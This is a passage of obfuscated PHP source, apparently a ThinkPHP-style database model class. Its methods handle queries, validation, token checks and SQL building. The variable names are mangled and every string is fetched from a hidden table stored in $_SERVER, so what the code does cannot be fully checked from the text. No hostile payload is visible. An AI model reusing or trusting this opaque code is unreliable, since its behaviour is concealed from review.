(!empty($ΩÀ‡ß˜⁄[$¢üê˛‹¢[275]])) { $ΩÀ‡ß˜⁄[$¢üê˛‹¢[274]] .= $¢üê˛‹¢[53] . $ΩÀ‡ß˜⁄[$¢üê˛‹¢[275]]; } $ΩÀ‡ß˜⁄[$¢üê˛‹¢[276]] = $this->name; if (isset($ΩÀ‡ß˜⁄[$¢üê˛‹¢[270]]) && is_array($ΩÀ‡ß˜⁄[$¢üê˛‹¢[270]]) && !empty($˛°ãäù‡) && !isset($ΩÀ‡ß˜⁄[$¢üê˛‹¢[277]]) && !isset($ΩÀ‡ß˜⁄[$¢üê˛‹¢[274]])) { foreach ($ΩÀ‡ß˜⁄[$¢üê˛‹¢[270]] as $ÕŒ±∂ÕÓ => $±ƒ≈ÿØÊ) { $ÕŒ±∂ÕÓ = trim($ÕŒ±∂ÕÓ); if (in_array($ÕŒ±∂ÕÓ, $˛°ãäù‡, !0)) { if (is_scalar($±ƒ≈ÿØÊ)) { $this->_parseType($ΩÀ‡ß˜⁄[$¢üê˛‹¢[270]], $ÕŒ±∂ÕÓ); } } elseif (!is_numeric($ÕŒ±∂ÕÓ) && $¢üê˛‹¢[11] != substr($ÕŒ±∂ÕÓ, 0, 1) && !1 === strpos($ÕŒ±∂ÕÓ, $¢üê˛‹¢[10]) && !1 === strpos($ÕŒ±∂ÕÓ, $¢üê˛‹¢[255]) && !1 === strpos($ÕŒ±∂ÕÓ, $¢üê˛‹¢[278]) && !1 === strpos($ÕŒ±∂ÕÓ, $¢üê˛‹¢[279])) { unset($ΩÀ‡ß˜⁄[$¢üê˛‹¢[270]][$ÕŒ±∂ÕÓ]); } } } $this->_options_filter($ΩÀ‡ß˜⁄); return $ΩÀ‡ß˜⁄; } protected function _options_filter(&$Òóò©Ñ√) { } protected function _parseType(&$≈–°‹úß, $óóø≠•û) { $••È°≈˜ =& $_SERVER[Çâä∆◊¡]; if (empty($this->options[$••È°≈˜[280]][$••È°≈˜[4] . $óóø≠•û])) { $…ÎÄèµú = strtolower($this->fields[$••È°≈˜[247]][$óóø≠•û]); if (!1 !== strpos($…ÎÄèµú, $••È°≈˜[281])) { } elseif (!1 === strpos($…ÎÄèµú, $••È°≈˜[282]) && !1 !== strpos($…ÎÄèµú, $••È°≈˜[283])) { $≈–°‹úß[$óóø≠•û] = intval($≈–°‹úß[$óóø≠•û]); } elseif (!1 !== strpos($…ÎÄèµú, $••È°≈˜[284]) || !1 !== strpos($…ÎÄèµú, $••È°≈˜[285])) { $≈–°‹úß[$óóø≠•û] = floatval($≈–°‹úß[$óóø≠•û]); } elseif (!1 !== strpos($…ÎÄèµú, $••È°≈˜[286])) { $≈–°‹úß[$óóø≠•û] = (bool) $≈–°‹úß[$óóø≠•û]; } } } public function find($Ê∆æ˝ˆå = array()) { $º≤“üô∏ =& $_SERVER[Çâä∆◊¡]; if (is_numeric($Ê∆æ˝ˆå) || is_string($Ê∆æ˝ˆå)) { $Å√§ÛÈ∏[$this->getPk()] = intval($Ê∆æ˝ˆå); $this->options[$º≤“üô∏[270]] = $Å√§ÛÈ∏; } $this->options[$º≤“üô∏[287]] = 1; $Ê∆æ˝ˆå = $this->_parseOptions(); $∑±ªÎÛπ = $this->db->select($Ê∆æ˝ˆå); if (!1 === $∑±ªÎÛπ) { return !1; } if (empty($∑±ªÎÛπ)) { return null; } $this->data = $∑±ªÎÛπ[0]; $this->_afterFind($this->data, $Ê∆æ˝ˆå); if (!empty($this->options[$º≤“üô∏[288]])) { return $this->returnResult($this->data, $this->options[$º≤“üô∏[288]]); } return $this->data; } protected function _afterFind(&$Âû€ü¥É, $•µâ¢≈Å) { } protected function returnResult($Á»∞º≤´, $”áπ¸≈˚ = '') { $∞◊∂®åŸ =& $_SERVER[Çâä∆◊¡]; if ($”áπ¸≈˚) { if (is_callable($”áπ¸≈˚)) { return call_user_func($”áπ¸≈˚, $Á»∞º≤´); } switch (strtolower($”áπ¸≈˚)) { case $∞◊∂®åŸ[289]: return json_encode($Á»∞º≤´); case $∞◊∂®åŸ[290]: return xml_encode($Á»∞º≤´); } } return $Á»∞º≤´; } public function parseFieldsMap($Àÿ¶‹à≠, $ö—îÚ˙† = 1) { if (!empty($this->_map)) { foreach ($this->_map as $é¡û“•º => $ﬁˆ˛¡Œœ) { if ($ö—îÚ˙† == 1) { if (isset($Àÿ¶‹à≠[$ﬁˆ˛¡Œœ])) { $Àÿ¶‹à≠[$é¡û“•º] = $Àÿ¶‹à≠[$ﬁˆ˛¡Œœ]; unset($Àÿ¶‹à≠[$ﬁˆ˛¡Œœ]); } } else { if (isset($Àÿ¶‹à≠[$é¡û“•º])) { $Àÿ¶‹à≠[$ﬁˆ˛¡Œœ] = $Àÿ¶‹à≠[$é¡û“•º]; unset($Àÿ¶‹à≠[$é¡û“•º]); } } } } return $Àÿ¶‹à≠; } public function setField($˛ÌñÓõ, $©—≥ﬁ˝Ú = '') { if (is_array($˛ÌñÓõ)) { $´‰í≥Ï… = $˛ÌñÓõ; } else { $´‰í≥Ï…[$˛ÌñÓõ] = $©—≥ﬁ˝Ú; } return $this->save($´‰í≥Ï…); } public function setAdd($ §∏®Ê˙, $†õà£ﬂÿ = 1) { $ıó¢˙¢Ú =& $_SERVER[Çâä∆◊¡]; $Ôê¿«Ëí = $ §∏®Ê˙ . $ıó¢˙¢Ú[291] . $†õà£ﬂÿ; if ($†õà£ﬂÿ < 0) { $Ôê¿«Ëí = $ §∏®Ê˙ . $†õà£ﬂÿ; } return $this->setField($ §∏®Ê˙, array($ıó¢˙¢Ú[292], $Ôê¿«Ëí)); } public function getField($˘‹ÛÈﬂÙ, $˛∏çÍπ÷ = null) { $›≤˚Û’ó =& $_SERVER[Çâä∆◊¡]; $à†›çæí[$›≤˚Û’ó[268]] = $˘‹ÛÈﬂÙ; $à†›çæí = $this->_parseOptions($à†›çæí); $˘‹ÛÈﬂÙ = trim($˘‹ÛÈﬂÙ); if (strpos($˘‹ÛÈﬂÙ, $›≤˚Û’ó[50])) { if (!isset($à†›çæí[$›≤˚Û’ó[287]])) { $à†›çæí[$›≤˚Û’ó[287]] = is_numeric($˛∏çÍπ÷) ? $˛∏çÍπ÷ : $›≤˚Û’ó[12]; } $›ú’ß£È = $this->db->select($à†›çæí); if (!empty($›ú’ß£È)) { $£ö¡ºÏ˛ = explode($›≤˚Û’ó[50], $˘‹ÛÈﬂÙ); $˘‹ÛÈﬂÙ = array_keys($›ú’ß£È[0]); $Ù±Ó≥ﬁß = array_shift($˘‹ÛÈﬂÙ); $ƒí„…°Ï = array_shift($˘‹ÛÈﬂÙ); $æòÊõØÍ = array(); $ºù€Ó“¬ = count($£ö¡ºÏ˛); foreach ($›ú’ß£È as $Œ˛∫„¥≠) { $ã≈œÿøú = $Œ˛∫„¥≠[$Ù±Ó≥ﬁß]; if (2 == $ºù€Ó“¬) { $æòÊõØÍ[$ã≈œÿøú] = $Œ˛∫„¥≠[$ƒí„…°Ï]; } else { $æòÊõØÍ[$ã≈œÿøú] = is_string($˛∏çÍπ÷) ? implode($˛∏çÍπ÷, $Œ˛∫„¥≠) : $Œ˛∫„¥≠; } } return $æòÊõØÍ; } } else { if (!0 !== $˛∏çÍπ÷) { $à†›çæí[$›≤˚Û’ó[287]] = is_numeric($˛∏çÍπ÷) ? $˛∏çÍπ÷ : 1; } if ($˛∏çÍπ÷ === $›≤˚Û’ó[250]) { unset($à†›çæí[$›≤˚Û’ó[287]]); } $Œ˛∫„¥≠ = $this->db->select($à†›çæí); if (!empty($Œ˛∫„¥≠)) { if ($˛∏çÍπ÷ === $›≤˚Û’ó[250]) { return reset($Œ˛∫„¥≠[0]); } if (!0 !== $˛∏çÍπ÷ && 1 == $à†›çæí[$›≤˚Û’ó[287]]) { return reset($Œ˛∫„¥≠[0]); } foreach ($Œ˛∫„¥≠ as $È¬ÊÑ’∞) { $£¨ãª°Â[] = $È¬ÊÑ’∞[$˘‹ÛÈﬂÙ]; } return $£¨ãª°Â; } } return null; } public function create($†çÛ¸˛ê = '', $íœ∂÷Æı = '') { $ªòÅ·ôö =& $_SERVER[Çâä∆◊¡]; if (empty($†çÛ¸˛ê)) { $†çÛ¸˛ê = $_POST; } elseif (is_object($†çÛ¸˛ê)) { $†çÛ¸˛ê = get_object_vars($†çÛ¸˛ê); } if (empty($†çÛ¸˛ê) || !is_array($†çÛ¸˛ê)) { $this->error = think_lang($ªòÅ·ôö[266]); return !1; } $†çÛ¸˛ê = $this->parseFieldsMap($†çÛ¸˛ê, 0); $íœ∂÷Æı = $íœ∂÷Æı ? $íœ∂÷Æı : (!empty($†çÛ¸˛ê[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ªòÅ·ôö[268]])) { $–îÒÂŸÁ = $this->options[$ªòÅ·ôö[268]]; unset($this->options[$ªòÅ·ôö[268]]); } elseif ($íœ∂÷Æı == THINK_MODEL_INSERT && isset($this->insertFields)) { $–îÒÂŸÁ = $this->insertFields; } elseif ($íœ∂÷Æı == THINK_MODEL_UPDATE && isset($this->updateFields)) { $–îÒÂŸÁ = $this->updateFields; } if (isset($–îÒÂŸÁ)) { if (is_string($–îÒÂŸÁ)) { $–îÒÂŸÁ = explode($ªòÅ·ôö[50], $–îÒÂŸÁ); } if (think_config($ªòÅ·ôö[293])) { $–îÒÂŸÁ[] = think_config($ªòÅ·ôö[294]); } foreach ($†çÛ¸˛ê as $‚Òıπ™˘ => $’üÈñ«) { if (!in_array($‚Òıπ™˘, $–îÒÂŸÁ)) { unset($†çÛ¸˛ê[$‚Òıπ™˘]); } } } if (!$this->autoValidation($†çÛ¸˛ê, $íœ∂÷Æı)) { return !1; } if (!$this->autoCheckToken($†çÛ¸˛ê)) { $this->error = think_lang($ªòÅ·ôö[295]); return !1; } if ($this->autoCheckFields) { $–îÒÂŸÁ = $this->getDbFields(); foreach ($†çÛ¸˛ê as $‚Òıπ™˘ => $’üÈñ«) { if (!in_array($‚Òıπ™˘, $–îÒÂŸÁ)) { unset($†çÛ¸˛ê[$‚Òıπ™˘]); } elseif (MAGIC_QUOTES_GPC && is_string($’üÈñ«)) { $†çÛ¸˛ê[$‚Òıπ™˘] = stripslashes($’üÈñ«); } } } $this->autoOperation($†çÛ¸˛ê, $íœ∂÷Æı); $this->data = $†çÛ¸˛ê; return $†çÛ¸˛ê; } public function autoCheckToken($´ÿÜ¥⁄Ä) { $Ò›œ´Üä =& $_SERVER[Çâä∆◊¡]; if (isset($this->options[$Ò›œ´Üä[296]]) && !$this->options[$Ò›œ´Üä[296]]) { return !0; } if (think_config($Ò›œ´Üä[293])) { $ΩıπÀà≥ = think_config($Ò›œ´Üä[294]); if (!isset($´ÿÜ¥⁄Ä[$ΩıπÀà≥]) || Session::get($ΩıπÀà≥)) { return !1; } list($Ú©‹Ê…∂, $¬¿≤πÓ‚) = explode($Ò›œ´Üä[11], $´ÿÜ¥⁄Ä[$ΩıπÀà≥]); if ($¬¿≤πÓ‚ && Session::get($ΩıπÀà≥ . $Ò›œ´Üä[10] . $Ú©‹Ê…∂) === $¬¿≤πÓ‚) { Session::remove($ΩıπÀà≥ . $Ò›œ´Üä[10] . $Ú©‹Ê…∂); return !0; } if (think_config($Ò›œ´Üä[297])) { Session::remove($ΩıπÀà≥ . $Ò›œ´Üä[10] . $Ú©‹Ê…∂); } return !1; } return !0; } public function regex($∆ïÎﬂ¨∏, $“≈–˚≈±) { $—åˆ·˛Ï =& $_SERVER[Çâä∆◊¡]; $Å§Ω˛È = array($—åˆ·˛Ï[298] => $—åˆ·˛Ï[299], $—åˆ·˛Ï[300] => $—åˆ·˛Ï[301], $—åˆ·˛Ï[302] => $—åˆ·˛Ï[303], $—åˆ·˛Ï[304] => $—åˆ·˛Ï[305], $—åˆ·˛Ï[306] => $—åˆ·˛Ï[307], $—åˆ·˛Ï[308] => $—åˆ·˛Ï[309], $—åˆ·˛Ï[310] => $—åˆ·˛Ï[311], $—åˆ·˛Ï[285] => $—åˆ·˛Ï[312], $—åˆ·˛Ï[313] => $—åˆ·˛Ï[314]); if (isset($Å§Ω˛È[strtolower($“≈–˚≈±)])) { $“≈–˚≈± = $Å§Ω˛È[strtolower($“≈–˚≈±)]; } return preg_match($“≈–˚≈±, $∆ïÎﬂ¨∏) === 1; } private function autoOperation(&$®¥‘Ë†», $»Ùˆ—é÷) { $ÃÊøÂ‹Ã =& $_SERVER[Çâä∆◊¡]; if (!empty($this->options[$ÃÊøÂ‹Ã[315]])) { $Äﬂ±¬ﬂ∞ = $this->options[$ÃÊøÂ‹Ã[315]]; unset($this->options[$ÃÊøÂ‹Ã[315]]); } elseif (!empty($this->_auto)) { $Äﬂ±¬ﬂ∞ = $this->_auto; } if (isset($Äﬂ±¬ﬂ∞)) { foreach ($Äﬂ±¬ﬂ∞ as $ö∞£·û©) { if (empty($ö∞£·û©[2])) { $ö∞£·û©[2] = THINK_MODEL_INSERT; } if ($»Ùˆ—é÷ == $ö∞£·û©[2] || $ö∞£·û©[2] == THINK_MODEL_BOTH) { switch (trim($ö∞£·û©[3])) { case $ÃÊøÂ‹Ã[316]: case $ÃÊøÂ‹Ã[317]: $ÿﬁá≈ËŸ = isset($ö∞£·û©[4]) ? (array) $ö∞£·û©[4] : array(); if (isset($®¥‘Ë†»[$ö∞£·û©[0]])) { array_unshift($ÿﬁá≈ËŸ, $®¥‘Ë†»[$ö∞£·û©[0]]); } if ($ÃÊøÂ‹Ã[316] == $ö∞£·û©[3]) { $®¥‘Ë†»[$ö∞£·û©[0]] = call_user_func_array($ö∞£·û©[1], $ÿﬁá≈ËŸ); } else { $®¥‘Ë†»[$ö∞£·û©[0]] = call_user_func_array(array(&$this, $ö∞£·û©[1]), $ÿﬁá≈ËŸ); } break; case $ÃÊøÂ‹Ã[268]: $®¥‘Ë†»[$ö∞£·û©[0]] = $®¥‘Ë†»[$ö∞£·û©[1]]; break; case $ÃÊøÂ‹Ã[318]: if ($ÃÊøÂ‹Ã[12] === $®¥‘Ë†»[$ö∞£·û©[0]]) { unset($®¥‘Ë†»[$ö∞£·û©[0]]); } break; case $ÃÊøÂ‹Ã[319]: default: $®¥‘Ë†»[$ö∞£·û©[0]] = $ö∞£·û©[1]; } if (!1 === $®¥‘Ë†»[$ö∞£·û©[0]]) { unset($®¥‘Ë†»[$ö∞£·û©[0]]); } } } } return $®¥‘Ë†»; } protected function autoValidation($°π·∆†ﬁ, $ä£ÇΩÜü) { $Â«ë»˜˝ =& $_SERVER[Çâä∆◊¡]; if (!empty($this->options[$Â«ë»˜˝[320]])) { $ﬂòﬁîïœ = $this->options[$Â«ë»˜˝[320]]; unset($this->options[$Â«ë»˜˝[320]]); } elseif (!empty($this->_validate)) { $ﬂòﬁîïœ = $this->_validate; } if (isset($ﬂòﬁîïœ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ﬂòﬁîïœ as $≠ûÄä√˛ => $≤ÏòÎåÍ) { if (empty($≤ÏòÎåÍ[5]) || $≤ÏòÎåÍ[5] == THINK_MODEL_BOTH || $≤ÏòÎåÍ[5] == $ä£ÇΩÜü) { if (0 == strpos($≤ÏòÎåÍ[2], $Â«ë»˜˝[321]) && strpos($≤ÏòÎåÍ[2], $Â«ë»˜˝[322])) { $≤ÏòÎåÍ[2] = think_lang(substr($≤ÏòÎåÍ[2], 2, -1)); } $≤ÏòÎåÍ[3] = isset($≤ÏòÎåÍ[3]) ? $≤ÏòÎåÍ[3] : THINK_EXISTS_VALIDATE; $≤ÏòÎåÍ[4] = isset($≤ÏòÎåÍ[4]) ? $≤ÏòÎåÍ[4] : $Â«ë»˜˝[323]; switch ($≤ÏòÎåÍ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($°π·∆†ﬁ, $≤ÏòÎåÍ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($Â«ë»˜˝[12] != trim($°π·∆†ﬁ[$≤ÏòÎåÍ[0]])) { if (!1 === $this->_validationField($°π·∆†ﬁ, $≤ÏòÎåÍ)) { return !1; } } break; default: if (isset($°π·∆†ﬁ[$≤ÏòÎåÍ[0]])) { if (!1 === $this->_validationField($°π·∆†ﬁ, $≤ÏòÎåÍ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ÓÎà∏”ÿ, $èÎÔøÜ±) { if (!1 === $this->_validationFieldItem($ÓÎà∏”ÿ, $èÎÔøÜ±)) { if ($this->patchValidate) { $this->error[$èÎÔøÜ±[0]] = $èÎÔøÜ±[2]; } else { $this->error = $èÎÔøÜ±[2]; return !1; } } return; } protected function _validationFieldItem($ù»Ø¶Œ˙, $¥ı⁄ØÖ§) { $Ú¬üÃôœ =& $_SERVER[Çâä∆◊¡]; switch (strtolower(trim($¥ı⁄ØÖ§[4]))) { case $Ú¬üÃôœ[316]: case $Ú¬üÃôœ[317]: $≠·ÙÆÌñ = isset($¥ı⁄ØÖ§[6]) ? (array) $¥ı⁄ØÖ§[6] : array(); if (is_string($¥ı⁄ØÖ§[0]) && strpos($¥ı⁄ØÖ§[0], $Ú¬üÃôœ[50])) { $¥ı⁄ØÖ§[0] = explode($Ú¬üÃôœ[50], $¥ı⁄ØÖ§[0]); } if (is_array($¥ı⁄ØÖ§[0])) { foreach ($¥ı⁄ØÖ§[0] as $”øôÌ˘√) { $”ﬁÇ°î[$”øôÌ˘√] = $ù»Ø¶Œ˙[$”øôÌ˘√]; } array_unshift($≠·ÙÆÌñ, $”ﬁÇ°î); } else { array_unshift($≠·ÙÆÌñ, $ù»Ø¶Œ˙[$¥ı⁄ØÖ§[0]]); } if ($Ú¬üÃôœ[316] == $¥ı⁄ØÖ§[4]) { return call_user_func_array($¥ı⁄ØÖ§[1], $≠·ÙÆÌñ); } else { return call_user_func_array(array(&$this, $¥ı⁄ØÖ§[1]), $≠·ÙÆÌñ); } case $Ú¬üÃôœ[324]: return $ù»Ø¶Œ˙[$¥ı⁄ØÖ§[0]] == $ù»Ø¶Œ˙[$¥ı⁄ØÖ§[1]]; case $Ú¬üÃôœ[325]: if (is_string($¥ı⁄ØÖ§[0]) && strpos($¥ı⁄ØÖ§[0], $Ú¬üÃôœ[50])) { $¥ı⁄ØÖ§[0] = explode($Ú¬üÃôœ[50], $¥ı⁄ØÖ§[0]); } $€ê†˝˙˜ = array(); if (is_array($¥ı⁄ØÖ§[0])) { foreach ($¥ı⁄ØÖ§[0] as $”øôÌ˘√) { $€ê†˝˙˜[$”øôÌ˘√] = $ù»Ø¶Œ˙[$”øôÌ˘√]; } } else { $€ê†˝˙˜[$¥ı⁄ØÖ§[0]] = $ù»Ø¶Œ˙[$¥ı⁄ØÖ§[0]]; } if (!empty($ù»Ø¶Œ˙[$this->getPk()])) { $€ê†˝˙˜[$this->getPk()] = array($Ú¬üÃôœ[326], $ù»Ø¶Œ˙[$this->getPk()]); } if ($this->where($€ê†˝˙˜)->find()) { return !1; } return !0; default: return $this->check($ù»Ø¶Œ˙[$¥ı⁄ØÖ§[0]], $¥ı⁄ØÖ§[1], $¥ı⁄ØÖ§[4]); } } public function check($Ùπïó˛ú, $µºÎ¯œì, $–˘ Ò› = "\x72\145\x67\145\170") { $Óì«≈◊Ä =& $_SERVER[Çâä∆◊¡]; $–˘ Ò› = strtolower(trim($–˘ Ò›)); switch ($–˘ Ò›) { case $Óì«≈◊Ä[7]: case $Óì«≈◊Ä[327]: $ﬁ¬ñ¯ô™ = is_array($µºÎ¯œì) ? $µºÎ¯œì : explode($Óì«≈◊Ä[50], $µºÎ¯œì); return $–˘ Ò› == $Óì«≈◊Ä[7] ? in_array($Ùπïó˛ú, $ﬁ¬ñ¯ô™) : !in_array($Ùπïó˛ú, $ﬁ¬ñ¯ô™); case $Óì«≈◊Ä[328]: case $Óì«≈◊Ä[329]: if (is_array($µºÎ¯œì)) { $ÕÁÉ¶øµ = $µºÎ¯œì[0]; $ä“ŸÏ‡é = $µºÎ¯œì[1]; } else { list($ÕÁÉ¶øµ, $ä“ŸÏ‡é) = explode($Óì«≈◊Ä[50], $µºÎ¯œì); } return $–˘ Ò› == $Óì«≈◊Ä[328] ? $Ùπïó˛ú >= $ÕÁÉ¶øµ && $Ùπïó˛ú <= $ä“ŸÏ‡é : $Ùπïó˛ú < $ÕÁÉ¶øµ || $Ùπïó˛ú > $ä“ŸÏ‡é; case $Óì«≈◊Ä[330]: case $Óì«≈◊Ä[331]: return $–˘ Ò› == $Óì«≈◊Ä[330] ? $Ùπïó˛ú == $µºÎ¯œì : $Ùπïó˛ú != $µºÎ¯œì; case $Óì«≈◊Ä[332]: $î´¶ç∆ò = mb_strlen($Ùπïó˛ú, $Óì«≈◊Ä[333]); if (strpos($µºÎ¯œì, $Óì«≈◊Ä[50])) { list($ÕÁÉ¶øµ, $ä“ŸÏ‡é) = explode($Óì«≈◊Ä[50], $µºÎ¯œì); return $î´¶ç∆ò >= $ÕÁÉ¶øµ && $î´¶ç∆ò <= $ä“ŸÏ‡é; } else { return $î´¶ç∆ò == $µºÎ¯œì; } case $Óì«≈◊Ä[334]: list($Ã’¥ì¡ì, $ïå¿£Àƒ) = explode($Óì«≈◊Ä[50], $µºÎ¯œì); if (!is_numeric($Ã’¥ì¡ì)) { $Ã’¥ì¡ì = strtotime($Ã’¥ì¡ì); } if (!is_numeric($ïå¿£Àƒ)) { $ïå¿£Àƒ = strtotime($ïå¿£Àƒ); } return NOW_TIME >= $Ã’¥ì¡ì && NOW_TIME <= $ïå¿£Àƒ; case $Óì«≈◊Ä[335]: return in_array(get_client_ip(), explode($Óì«≈◊Ä[50], $µºÎ¯œì)); case $Óì«≈◊Ä[336]: return !in_array(get_client_ip(), explode($Óì«≈◊Ä[50], $µºÎ¯œì)); case $Óì«≈◊Ä[323]: default: return $this->regex($Ùπïó˛ú, $µºÎ¯œì); } } public function query($˙î®Ÿ∂≈, $àóúÇﬂ˙ = false) { $ñ·ø∫ëË =& $_SERVER[Çâä∆◊¡]; if (!is_bool($àóúÇﬂ˙) && !is_array($àóúÇﬂ˙)) { $àóúÇﬂ˙ = func_get_args(); array_shift($àóúÇﬂ˙); } $˙î®Ÿ∂≈ = str_replace(array($ñ·ø∫ëË[226], $ñ·ø∫ëË[337]), $ñ·ø∫ëË[53], $˙î®Ÿ∂≈); $˙î®Ÿ∂≈ = $this->parseSql($˙î®Ÿ∂≈, $àóúÇﬂ˙); return $this->db->query($˙î®Ÿ∂≈); } public function execute($Öœ‰®’å, $ŸÖúÈ∫∞ = false) { if (!is_bool($ŸÖúÈ∫∞) && !is_array($ŸÖúÈ∫∞)) { $ŸÖúÈ∫∞ = func_get_args(); array_shift($ŸÖúÈ∫∞); } $Öœ‰®’å = $this->parseSql($Öœ‰®’å, $ŸÖúÈ∫∞); return $this->db->execute($Öœ‰®’å); } protected function parseSql($ÄŒëöÜ’, $∞∂ë≥Å¿) { $é∏Ùõ§€ =& $_SERVER[Çâä∆◊¡]; if (!0 === $∞∂ë≥Å¿) { $¡≈õ£ÇÀ = $this->_parseOptions(); $ÄŒëöÜ’ = $this->db->parseSql($ÄŒëöÜ’, $¡≈õ£ÇÀ); } elseif (is_array($∞∂ë≥Å¿)) { $∞∂ë≥Å¿ = array_map(array($this->db, $é∏Ùõ§€[338]), $∞∂ë≥Å¿); $ÄŒëöÜ’ = vsprintf($ÄŒëöÜ’, $∞∂ë≥Å¿); } else { $ÄŒëöÜ’ = strtr($ÄŒëöÜ’, array($é∏Ùõ§€[339] => $this->getTableName(), $é∏Ùõ§€[340] => think_config($é∏Ùõ§€[239]))); } $this->db->setModel($this->name); return $ÄŒëöÜ’; } public function db($„æö¸Á¸ = '', $¬æìß—ı = '', $ôÏÑ»Åß = array()) { $©¿æÜÈ¨ =& $_SERVER[Çâä∆◊¡]; if ($©¿æÜÈ¨[12] === $„æö¸Á¸ && $this->db) { return $this->db; } static $èÅ™∫Îñ = array(); static $Ôúåπ⁄ñ = array(); if (!isset($Ôúåπ⁄ñ[$„æö¸Á¸]) || isset($Ôúåπ⁄ñ[$„æö¸Á¸]) && $¬æìß—ı && $èÅ™∫Îñ[$„æö¸Á¸] != $¬æìß—ı) { if (!empty($¬æìß—ı) && is_string($¬æìß—ı) && !1 === strpos($¬æìß—ı, $©¿æÜÈ¨[8])) { $¬æìß—ı = think_config($¬æìß—ı); } $„æö¸Á¸ = think_guid($¬æìß—ı); $Ôúåπ⁄ñ[$„æö¸Á¸] = Db::getInstance($¬æìß—ı); } elseif (NULL === $¬æìß—ı) { $Ôúåπ⁄ñ[$„æö¸Á¸]->close(); unset($Ôúåπ⁄ñ[$„æö¸Á¸]); return; } if (!empty($ôÏÑ»Åß)) { if (is_string($ôÏÑ»Åß)) { parse_str($ôÏÑ»Åß, $ôÏÑ»Åß); } foreach ($ôÏÑ»Åß as $áı˚Ÿ√ó => $⁄ÌÖÈƒº) { $this->setProperty($áı˚Ÿ√ó, $⁄ÌÖÈƒº); } } $èÅ™∫Îñ[$„æö¸Á¸] = $¬æìß—ı; $this->db = $Ôúåπ⁄ñ[$„æö¸Á¸]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Û≥˛ıœû = get_class($this); if ($Û≥˛ıœû == $_SERVER[Çâä∆◊¡][341]) { return $this->name; } $this->name = substr($Û≥˛ıœû, 0, -5); } return $this->name; } public function getTableName() { $Ëä˙ñø— =& $_SERVER[Çâä∆◊¡]; if (empty($this->trueTableName)) { $îôıÜÊæ = !empty($this->tablePrefix) ? $this->tablePrefix : $Ëä˙ñø—[12]; if (!empty($this->tableName)) { $îôıÜÊæ .= $this->tableName; } else { $îôıÜÊæ .= think_parse_name($this->name); } $this->trueTableName = strtolower($îôıÜÊæ); } return (!empty($this->dbName) ? $this->dbName . $Ëä˙ñø—[10] : $Ëä˙ñø—[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $∑» ¬•ø =& $_SERVER[Çâä∆◊¡]; return isset($this->fields[$∑» ¬•ø[246]]) ? $this->fields[$∑» ¬•ø[246]] : $this->pk; } public function getDbFields() { $¨áÓàÖ£ =& $_SERVER[Çâä∆◊¡]; if (isset($this->options[$¨áÓàÖ£[274]])) { $π•¨®ü˘ = $this->db->getFields($this->options[$¨áÓàÖ£[274]]); return $π•¨®ü˘ ? array_keys($π•¨®ü˘) : !1; } if ($this->fields) { $π•¨®ü˘ = $this->fields; unset($π•¨®ü˘[$¨áÓàÖ£[245]], $π•¨®ü˘[$¨áÓàÖ£[246]], $π•¨®ü˘[$¨áÓàÖ£[247]], $π•¨®ü˘[$¨áÓàÖ£[244]]); return $π•¨®ü˘; } return !1; } public function data($˛ä˛√õ¯ = '') { $˜∆îä€û =& $_SERVER[Çâä∆◊¡]; if ($˜∆îä€û[12] === $˛ä˛√õ¯ && !empty($this->data)) { return $this->data; } if (is_object($˛ä˛√õ¯)) { $˛ä˛√õ¯ = get_object_vars($˛ä˛√õ¯); } elseif (is_string($˛ä˛√õ¯)) { parse_str($˛ä˛√õ¯, $˛ä˛√õ¯); } elseif (!is_array($˛ä˛√õ¯)) { think_exception(think_lang($˜∆îä€û[266])); } $this->data = $˛ä˛√õ¯; return $this; } public function join($‰“¨íëü) { $Óàº§àù =& $_SERVER[Çâä∆◊¡]; if (is_array($‰“¨íëü)) { $this->options[$Óàº§àù[277]] = $‰“¨íëü; } elseif (!empty($‰“¨íëü)) { $this->options[$Óàº§àù[277]][] = $‰“¨íëü; } return $this; } public function union($ÇÊ˘Í–⁄, $ùœŸåÈô = false) { $•éƒ≤Äˆ =& $_SERVER[Çâä∆◊¡]; if (empty($ÇÊ˘Í–⁄)) { return $this; } if ($ùœŸåÈô) { $this->options[$•éƒ≤Äˆ[342]][$•éƒ≤Äˆ[343]] = !0; } if (is_object($ÇÊ˘Í–⁄)) { $ÇÊ˘Í–⁄ = get_object_vars($ÇÊ˘Í–⁄); } if (is_string($ÇÊ˘Í–⁄)) { $˝›ã«ª = $ÇÊ˘Í–⁄; } elseif (is_array($ÇÊ˘Í–⁄)) { if (isset($ÇÊ˘Í–⁄[0])) { $this->options[$•éƒ≤Äˆ[342]] = array_merge($this->options[$•éƒ≤Äˆ[342]], $ÇÊ˘Í–⁄); return $this; } else { $˝›ã«ª = $ÇÊ˘Í–⁄; } } else { think_exception(think_lang($•éƒ≤Äˆ[266])); } $this->options[$•éƒ≤Äˆ[342]][] = $˝›ã«ª; return $this; } public function cache($µÃ˝Æ•á = true, $Òô‡–¯§ = null, $⁄†«Àôü = '') { $´’ë≥ä‹ =& $_SERVER[Çâä∆◊¡]; if (!1 !== $µÃ˝Æ•á) { $this->options[$´’ë≥ä‹[344]] = array($´’ë≥ä‹[95] => $µÃ˝Æ•á, $´’ë≥ä‹[334] => $Òô‡–¯§, $´’ë≥ä‹[33] => $⁄†«Àôü); } return $this; } public function field($Ú§¥Œ∑, $“»ô‡Âı = false) { $÷ÕêÍ©ö =& $_SERVER[Çâä∆◊¡]; if (!0 === $Ú§¥Œ∑) { $Ñ ÒüÔ = $this->getDbFields(); $Ú§¥Œ∑ = $Ñ ÒüÔ ? $Ñ ÒüÔ : $÷ÕêÍ©ö[181]; } elseif ($“»ô‡Âı) { if (is_string($Ú§¥Œ∑)) { $Ú§¥Œ∑ = explode($÷ÕêÍ©ö[50], $Ú§¥Œ∑); } $Ñ ÒüÔ = $this->getDbFields(); $Ú§¥Œ∑ = $Ñ 